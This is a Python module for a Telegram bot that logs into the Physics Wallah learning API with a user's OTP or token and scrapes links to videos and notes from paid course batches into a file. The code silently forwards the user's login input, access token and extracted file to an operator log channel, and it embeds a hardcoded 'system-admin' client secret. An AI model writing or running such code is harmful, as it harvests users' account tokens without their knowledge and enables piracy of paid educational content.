import requests
import asyncio
from pyrogram import Client, filters
import requests, os, sys, re
import math
import json, asyncio
from config import PREMIUM_LOGS, join
import subprocess
import datetime
from Extractor import app
from pyrogram import filters
from subprocess import getstatusoutput
from datetime import datetime
from Extractor.core.utils import forward_to_log
import pytz
import re
import unicodedata
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict
import time

india_timezone = pytz.timezone('Asia/Kolkata')
current_time = datetime.now(india_timezone)
time_new = current_time.strftime("%d-%m-%Y %I:%M %p")

async def fetch_content(session, url, headers) -> dict:
    async with session.get(url, headers=headers) as response:
        return await response.json()

async def process_subject_content(session, target_id, subject_id, headers, all_links: List[str], total_links: List[int], subject_name: str = ""):
    tasks = []
    for page in range(1, 12):
        url = f"https://api.penpencil.co/v2/batches/{target_id}/subject/{subject_id}/contents?page={page}&contentType=exercises-notes-videos"
        tasks.append(fetch_content(session, url, headers))
    
    responses = await asyncio.gather(*tasks)
    
    for content_response in responses:
        if not content_response.get("data"):
            continue
            
        for item in content_response.get("data", []):
            try:
                video_details = item.get("videoDetails", {})
                content_id = video_details.get("findKey") if video_details else None
                topic = clean_text(item.get("topic", ""))
                url = item.get("url", "")
                content_type = "video"
                if item.get("lectureType"):
                    content_type = item.get("lectureType").lower()
                
                date = extract_date(item)
                if url:
                    if '.mpd' in url:
                        final_url, parent_id, child_id = extract_mpd_info(url, content_id, target_id)
                        line = format_content_line(topic, final_url, subject_name, parent_id, child_id, date)
                        all_links.append(line)
                        total_links[0] += 1
                    else:
                        line = format_content_line(topic, url, subject_name, date=date)
                        all_links.append(line)
                        total_links[0] += 1

                for hw in item.get("homeworkIds", []):
                    hw_id = hw.get("_id")
                    hw_date = extract_date(hw) or date
                    for attachment in hw.get("attachmentIds", []):
                        try:
                            name = clean_text(attachment.get("name", ""))
                            base_url = attachment.get("baseUrl", "")
                            key = attachment.get("key", "")
                            if key:
                                full_url = f"{base_url}{key}"
                                if '.mpd' in full_url:
                                    final_url, parent_id, child_id = extract_mpd_info(full_url, hw_id, target_id)
                                    line = format_content_line(name, final_url, subject_name, parent_id, child_id, hw_date)
                                    all_links.append(line)
                                    total_links[0] += 1
                                else:
                                    line = format_content_line(name, full_url, subject_name, date=hw_date)
                                    all_links.append(line)
                                    total_links[0] += 1
                        except Exception as e:
                            continue
            except Exception as e:
                continue

def extract_mpd_info(url, content_id=None, batch_id=None):
    """Extract MPD URL info and handle PW's specific URL format"""
    # For cloudfront URLs, we use content_id as childId and batch_id as parentId
    if 'cloudfront.net' in url:
        return url, batch_id, content_id
    
    # Handle regular URLs with parentId/childId
    base_url = url.split('parentId=')[0].rstrip('&') if 'parentId=' in url else url
    parent_match = re.search(r'parentId=([^&]+)', url)
    child_match = re.search(r'childId=([^&]+)', url)
    
    parent_id = parent_match.group(1) if parent_match else batch_id
    child_id = child_match.group(1) if child_match else content_id
    
    return base_url, parent_id, child_id

def clean_text(text):
    if not text:
        return ""
    # Remove control characters and normalize
    text = "".join(ch for ch in text if unicodedata.category(ch)[0] != "C")
    text = unicodedata.normalize('NFKD', text).encode('ascii', 'ignore').decode('ascii')
    # Replace problematic characters
    text = text.replace(":", "_").replace("/", "_").replace("|", "_").replace("\\", "_")
    return text

def extract_date(item):
    """Extract and format date from API response item"""
    for field in ['createdAt', 'created_at', 'date', 'startTime', 'updatedAt', 'updated_at']:
        val = item.get(field)
        if val:
            try:
                from datetime import datetime as dt
                if isinstance(val, (int, float)):
                    # Unix timestamp (seconds or milliseconds)
                    if val > 1e12:
                        val = val / 1000
                    return dt.fromtimestamp(val).strftime('%d-%m-%Y')
                elif isinstance(val, str):
                    # Try common date formats
                    for fmt in ['%Y-%m-%dT%H:%M:%S.%fZ', '%Y-%m-%dT%H:%M:%SZ', '%Y-%m-%d %H:%M:%S', '%Y-%m-%d']:
                        try:
                            return dt.strptime(val[:len(fmt.replace('%','').replace('f','').replace('Z',''))], fmt).strftime('%d-%m-%Y')
                        except:
                            continue
                    # Fallback: try to parse with dateutil or just return first 10 chars
                    if len(val) >= 10:
                        return val[:10]
            except:
                pass
    return ""

def sort_lines_by_date(lines):
    """Sort output lines by embedded date in ascending order (oldest first).
    Handles both YYYY-MM-DD and DD-MM-YYYY date formats."""
    import re as _re
    from datetime import datetime as _dt
    def _extract_sort_date(line):
        # Try YYYY-MM-DD format first (e.g., 2025-09-23) - more specific
        match = _re.search(r'(\d{4})-(\d{2})-(\d{2})', line)
        if match:
            try:
                return _dt.strptime(match.group(0), '%Y-%m-%d')
            except:
                pass
        # Try DD-MM-YYYY format (e.g., 23-09-2025)
        match = _re.search(r'(\d{2})-(\d{2})-(\d{4})', line)
        if match:
            try:
                day, month, year = match.group(1), match.group(2), match.group(3)
                return _dt.strptime(f"{year}-{month}-{day}", '%Y-%m-%d')
            except:
                pass
        return _dt.min
    return sorted(lines, key=_extract_sort_date)

def format_content_line(name, url, subject_name="", parent_id=None, child_id=None, date=""):
    """Format content line with subject name and date as prefix"""
    name = clean_text(name)
    prefix = f"[{subject_name}] " if subject_name else ""
    date_str = f"{date} " if date else ""
    
    if parent_id and child_id:
        return f"{prefix}{date_str}{name}:{url}&parentId={parent_id}&childId={child_id}"
    return f"{prefix}{date_str}{name}:{url}"

@app.on_message(filters.command(["pw"]))
async def pw_login(app, message):
    try:
        query_msg = await app.ask(
            chat_id=message.chat.id,
            text="🔐 **Enter your PW Mobile No. (without country code) or your Login Token:** , --- \n **DONT LOGIN WITH PHONE NUMBER, It Leads to ban your account of PW**")
        await forward_to_log(query_msg, "PW Extractor")
        
        user_input = query_msg.text.strip()

        if user_input.isdigit():
            mob = user_input
            payload = {
                "username": mob,
                "countryCode": "+91",
                "organizationId": "5eb393ee95fab7468a79d189"
            }
            headers = {
                "client-id": "5eb393ee95fab7468a79d189",
                "client-version": "12.84",
                "Client-Type": "MOBILE",
                "randomId": "e4307177362e86f1",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json"
            }
            
            await app.send_message(message.chat.id, "🔄 **Sending OTP... Please wait!**")
            otp_response = requests.post(
                "https://api.penpencil.co/v1/users/get-otp?smsType=0", 
                headers=headers, 
                json=payload
            ).json()

            if not otp_response.get("success"):
                await message.reply_text("❌ **Invalid Mobile Number! Please provide a valid PW login number.**")
                return
            
            await app.send_message(message.chat.id, "✅ **OTP sent successfully! Please enter your OTP:**")
            otp_msg = await app.ask(message.chat.id, text="🔑 **Enter the OTP you received:**")
            otp = otp_msg.text.strip()

            token_payload = {
                "username": mob,
                "otp": otp,
                "client_id": "system-admin",
                "client_secret": "KjPXuAVfC5xbmgreETNMaL7z",
                "grant_type": "password",
                "organizationId": "5eb393ee95fab7468a79d189",
                "latitude": 0,
                "longitude": 0
            }
            
            await app.send_message(message.chat.id, "🔄 **Verifying OTP... Please wait!**")
            token_response = requests.post(
                "https://api.penpencil.co/v3/oauth/token", 
                data=token_payload
            ).json()
            
            token = token_response.get("data", {}).get("access_token")
            if not token:
                await message.reply_text("❌ **Login failed! Invalid OTP.**")
                return
            
            dl = (f"✅ ** PW Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await message.reply_text(f"✅ **Login Successful!**\n\n🔑 **Here is your token:**\n`{token}`")
            await app.send_message(PREMIUM_LOGS, dl)
        
        elif user_input.startswith("e"):
            token = user_input
        else:
            await message.reply_text("❌ **Invalid input! Please provide a valid mobile number or token.**")
            return


        headers = {
            "client-id": "5eb393ee95fab7468a79d189",
            "client-type": "WEB",
            "Authorization": f"Bearer {token}",
            "client-version": "3.3.0",
            "randomId": "04b54cdb-bf9e-48ef-974d-620e21bd3e23",
            "Accept": "application/json, text/plain, */*"
        }
        
        batch_response = requests.get(
            "https://api.penpencil.co/v3/batches/my-batches?mode=1&amount=paid&page=1", 
            headers=headers
        ).json()
        
        batches = batch_response.get("data", [])
        if not batches:
            await message.reply_text("❌ **No batches found for this account.**")
            return


        batch_text = "📚 **Your Batches:**\n\n"
        batch_map = {}
        for batch in batches:
            bi = batch.get("_id")
            bn = batch.get("name")
            batch_text += f"📖 `{bi}` → **{bn}**\n"
            batch_map[bi] = bn

        query_msg = await app.send_message(
            chat_id=message.chat.id, 
            text=batch_text + "\n\n💡 **Please enter the Course ID to continue:**",
            reply_markup=None
        )
        
        target_id_msg = await app.ask(message.chat.id, text="🆔 **Enter the Course ID here:**")
        target_id = target_id_msg.text.strip()


        if target_id not in batch_map:
            await message.reply_text("❌ **Invalid Course ID! Please try again.**")
            return

        batch_name = batch_map[target_id]
        filename = f"{batch_name.replace('/', '_').replace(':', '_').replace('|', '_')}.txt"

        await app.send_message(
            chat_id=message.chat.id, 
            text=f"🕵️ **Fetching details for Batch:** **{batch_name}**... Please wait!"
        )
        course_response = requests.get(
            f"https://api.penpencil.co/v3/batches/{target_id}/details", 
            headers=headers
        ).json()
        
        subjects = course_response.get("data", {}).get("subjects", [])
        if not subjects:
            await message.reply_text("❌ **No subjects found for the selected course.**")
            return

        progress_msg = await app.send_message(
            chat_id=message.chat.id, 
            text="🚀 **Initializing High-Speed Extraction...**"
        )

        all_subjects_progress = {}
        total_links = [0]  # Using list to make it mutable in subfunctions
        all_links = []

        async def update_progress():
            progress_text = "📊 **Extraction Progress**\n\n"
            for subject, status in all_subjects_progress.items():
                icon = "✅" if status else "⏳"
                progress_text += f"{icon} **{subject}**\n"
            progress_text += f"\n📝 Total Links: {total_links[0]}"
            await progress_msg.edit_text(progress_text)

        start_time = time.time()
        
        # Process all subjects concurrently
        async with aiohttp.ClientSession() as session:
            tasks = []
            for subject in subjects:
                si = subject.get("_id")
                sn = clean_text(subject.get("subject", ""))
                all_subjects_progress[sn] = False
                await update_progress()
                
                task = process_subject_content(session, target_id, si, headers, all_links, total_links, sn)
                tasks.append(task)
            
            await asyncio.gather(*tasks)
            
            for sn in all_subjects_progress:
                all_subjects_progress[sn] = True
            await update_progress()

        # Sort links by date in ascending order
        all_links = sort_lines_by_date(all_links)

        # Write all collected links to file
        with open(filename, 'w', encoding='utf-8') as f:
            for line in all_links:
                f.write(line + "\n")
            
            f.write("\n━━━━━━━━━━━━━━━━━━━━━\n")
            f.write("🌟 Join Us: @UGxPrivate\n")
            f.write("━━━━━━━━━━━━━━━━━━━━━")

        end_time = time.time()
        extraction_time = end_time - start_time

        up = (f"**Login Succesfull for PW:** `{token}`")
        captionn = (f" App Name : Physics Wallah \n\n PURCHASED BATCHES : {batch_text}")
        caption = (
                 f"࿇ ══━━ 🏦 ━━══ ࿇\n\n"
                 f"🌀 **Aᴘᴘ Nᴀᴍᴇ** : ᴘʜʏsɪᴄs ᴡᴀʟʟᴀʜ (𝗣𝘄)\n"
                 f"============================\n\n"
                 f"✳️**Bᴀᴛᴄʜ ID** : **{target_id}**\n"
                 f"🎯 **Bᴀᴛᴄʜ Nᴀᴍᴇ** : `{batch_name}`\n"
                 f"⚡ **Extraction Time**: {extraction_time:.2f}s\n\n"
                 f"🌐 **Jᴏɪɴ Us** : {join}\n"
                 f"❄️ **Dᴀᴛᴇ** : {time_new}")

        await app.send_document(chat_id=message.chat.id, document=filename, caption=caption)
        await app.send_document(PREMIUM_LOGS, document=filename, caption=captionn)
        await app.send_message(PREMIUM_LOGS, up)

    except Exception as e:
        error_msg = str(e)
        error_msg = clean_text(error_msg[:200]) + "..." if len(error_msg) > 200 else clean_text(error_msg)
        await message.reply_text(f"❌ **An error occurred:** `{error_msg}`")
            
